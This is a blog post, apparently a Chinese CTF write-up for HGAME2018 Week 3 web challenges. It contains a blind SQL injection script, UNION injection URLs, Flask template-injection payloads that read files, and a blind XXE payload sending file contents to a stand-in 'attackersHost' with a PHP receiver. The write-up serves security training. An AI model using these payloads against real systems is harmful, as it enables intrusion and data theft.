@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF_Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…12345678910111213141516&amp;lt;?php.....$username = base64_decode($_COOKIE[&apos;name&apos;]);.....$sql = &quot;select * from user where username = &apos;&amp;#123;$username&amp;#125;&apos;&quot;;$re =">
+<meta name="keywords" content="CTF_Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME2018 Week-3 Web Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/index.html">
+<meta property="og:site_name" content="Willard&#39;s Blog">
+<meta property="og:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…12345678910111213141516&amp;lt;?php.....$username = base64_decode($_COOKIE[&apos;name&apos;]);.....$sql = &quot;select * from user where username = &apos;&amp;#123;$username&amp;#125;&apos;&quot;;$re =">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe59401e.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe5b650f.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe5be804.jpg">
+<meta property="og:updated_time" content="2018-03-03T13:17:09.586Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HGAME2018 Week-3 Web Writeup">
+<meta name="twitter:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…12345678910111213141516&amp;lt;?php.....$username = base64_decode($_COOKIE[&apos;name&apos;]);.....$sql = &quot;select * from user where username = &apos;&amp;#123;$username&amp;#125;&apos;&quot;;$re =">
+<meta name="twitter:image" content="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/"/>
+
+
+
+
+
+  <title>HGAME2018 Week-3 Web Writeup | Willard's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Willard's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">我上去就是一个阿瓦达索命~</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Willard">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/02/19/5a8ad395132b9.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Willard's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HGAME2018 Week-3 Web Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-03T10:28:11+08:00">
+                2018-03-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="正常的SQLi"><a href="#正常的SQLi" class="headerlink" title="正常的SQLi"></a>正常的SQLi</h2><p>打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from user where username = '&#123;<span class="variable">$username</span>&#125;'"</span>;</span><br><span class="line"><span class="variable">$re</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = mysqli_fetch_array(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line">// <span class="built_in">echo</span> <span class="variable">$rs</span>[<span class="string">'flag'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$username</span> . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"因为出题人太懒了，所以现在没有任何功能"</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p>
+<p>看起来觉得像是cookie注入，还需要进行base64加密，重新进入index.php抓包进行分析，先进性一次url解码然后再base64解码后发现是guest。<br>所以这里切换为admin，然后base64加密，YWRtaW4=，等号用%3d进行绕过测试，界面变成了hello admin，so…应该就是cookie注入,所以写脚本注入。<br>首先判断数据库的长度：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="comment">#test the length of database.</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	<span class="attribute">url</span>=<span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line">		<span class="attribute">r</span>=requests.session()</span><br><span class="line">		<span class="attribute">payload</span>=<span class="string">"admin' or if(length(database())="</span>+str(i)+",1,sleep(3))#"</span><br><span class="line">		cookie=&#123;<span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))&#125;</span><br><span class="line">		<span class="attribute">start_time</span>=time.time()</span><br><span class="line">		r.post(<span class="attribute">url</span>=url,cookies=cookie)</span><br><span class="line">		<span class="keyword">if</span> time.time()-start_time&lt;2:</span><br><span class="line">			<span class="builtin-name">print</span> <span class="string">"The length of database is "</span>,i</span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>=="__main__":</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
+<p>数据库长度为4，然后就是一系列的查找什么的…<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>willardtm.github.io<span class="regexp">/2018/</span><span class="number">02</span><span class="regexp">/19/</span>sqlilabs-Less-<span class="number">5</span>~<span class="number">6</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
+<p>但是我觉得这样做一道题感觉有些麻烦，我在想能不能减少一些步骤来提高效率，so我找到了一份大师傅的WP，对比一下我发现大师傅和我做的不一样的是大师傅没有直接跑出对应表/列的长度，而是定义了一个比较大的数字直接运行。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">url = <span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,1000):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((),%s,1))=%s),sleep(3),false)#"</span>%(i,j)  user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(3),false)#"</span>%(i,j) user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        payload = <span class="string">"admin' or if((ascii(substr((select flag from user limit 2,1),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        cookie = &#123;</span><br><span class="line">            <span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url,cookies=cookie,timeout=2.5)</span><br><span class="line">        except:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            <span class="builtin-name">print</span> flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
+<p>大师傅博客链接：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/<span class="number">2018</span>/<span class="number">02</span>/<span class="number">21</span>/week<span class="number">3</span>-hgame<span class="symbol">%E4</span><span class="symbol">%B9</span><span class="symbol">%8</span>Bweb<span class="symbol">%E7</span><span class="symbol">%B2</span><span class="symbol">%97</span><span class="symbol">%E7</span><span class="symbol">%95</span><span class="symbol">%A5</span><span class="symbol">%E8</span><span class="symbol">%AE</span><span class="symbol">%B0</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span>/#week<span class="number">3</span>-<span class="symbol">%E4</span><span class="symbol">%B9</span><span class="symbol">%A6</span><span class="symbol">%E5</span><span class="symbol">%BA</span><span class="symbol">%97</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="简单的SQLi"><a href="#简单的SQLi" class="headerlink" title="简单的SQLi"></a>简单的SQLi</h2><p>这道不太会…（拿出小本本记好），等一等wp。</p>
+<h2 id="送分的SQLi"><a href="#送分的SQLi" class="headerlink" title="送分的SQLi"></a>送分的SQLi</h2><p>id=1这里是注入点，然后常规注入就行。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10068/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>爆出表：f111aa4g,users<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10068/?id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x6631313161613467</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>爆出列：id,dajiangyoude,f111aaaggg_w3<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/118.25.18.223:10068/</span>?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">f111aaaggg_w3</span> <span class="title">from</span> <span class="title">f111aa4g</span>%23</span></span><br></pre></td></tr></table></figure></p>
+<p>这样就能拿到flag。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Th3_e4sist_sql_injeCti0n##&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="ngc’s-blog"><a href="#ngc’s-blog" class="headerlink" title="ngc’s blog"></a>ngc’s blog</h2><p>这是一道基于Python的模板注入…可以直接google搜索Flask漏洞…下面就是一大堆…所以对当前URL进行测试。<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.230</span>.<span class="number">105.104</span>:<span class="number">5000</span>/&#123;&#123;<span class="string">'abcd'</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg" alt=""><br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.230</span>.<span class="number">105.104</span>:<span class="number">5000</span>/&#123;&#123;<span class="string">'abcd'</span>.upper()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后发现abcd这四个字母变成了大写字母…通过这里发现能够进行代码执行…<br><img src="https://i.loli.net/2018/03/03/5a9a9fe59401e.jpg" alt=""><br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现这里返回出了两个东西，but好像没什么用…<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://111.230.105.104:5000/&#123;&#123;''.__class__.__mro__</span>[<span class="string">2</span>]._<span class="emphasis">_subclasses_</span><span class="emphasis">_()&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过这样的方法就能看到所有类<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/03/03/5a9a9fe5b650f.jpg" alt=""><br>提示说flag在flag里面，所以读取…OK拿到flag…<br><img src="https://i.loli.net/2018/03/03/5a9a9fe5be804.jpg" alt=""><br>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>drops.xmd5.com<span class="regexp">/static/</span>drops<span class="regexp">/tips-13683.html</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="书店"><a href="#书店" class="headerlink" title="**书店"></a>**书店</h2><p>题目上已经给出来了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">     不喜欢我推荐的？那就把你喜欢的传上来看看啊</span></span><br><span class="line"><span class="comment">     &lt;input name="a" type="text"&gt;</span></span><br><span class="line"><span class="comment">     我只收经过base64的xml格式的书哦</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>所以这很明显是一个xml注入攻击，根据题目提示flag在/a/b下面，所以这是一个外部实体注入的xml,先构建xml攻击语句。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY w SYSTEM "file:///a/b"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;w;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>base64加密以后post数据…然而…什么回显都没有，想想这题250分，应该没这么简单，那就是Blind XXE了。<br>所以重新构造…<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE ANY[</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">a</span>/<span class="attr">b</span>"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">attackersHost</span>/<span class="attr">xxe.xml</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%remote;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">%all;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> % <span class="keyword">all</span> <span class="string">"&lt;!ENTITY send SYSTEM 'http://attackersHost/xxe.php?data=%data;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123;</span></span><br><span class="line"><span class="php">    file_put_contents(<span class="string">'data'</span>, $_GET[<span class="string">'data'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/u011721501/</span>article<span class="regexp">/details/</span><span class="number">43775691</span></span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Web/" rel="tag"># CTF_Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/27/HGAME2018-Week-2-Writeup/" rel="next" title="HGAME2018 Week-2 Web Writeup">
+                <i class="fa fa-chevron-left"></i> HGAME2018 Week-2 Web Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2018/02/19/5a8ad395132b9.jpg"
+                alt="Willard" />
+            
+              <p class="site-author-name" itemprop="name">Willard</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://030.im/" title="Misaka030" target="_blank">Misaka030</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#正常的SQLi"><span class="nav-number">1.</span> <span class="nav-text">正常的SQLi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的SQLi"><span class="nav-number">2.</span> <span class="nav-text">简单的SQLi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#送分的SQLi"><span class="nav-number">3.</span> <span class="nav-text">送分的SQLi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ngc’s-blog"><span class="nav-number">4.</span> <span class="nav-text">ngc’s blog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#书店"><span class="nav-number">5.</span> <span class="nav-text">**书店</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Willard</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+本站总访问量 <span id="busuanzi_value_site_pv"></span> &nbsp&nbsp&nbsp
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
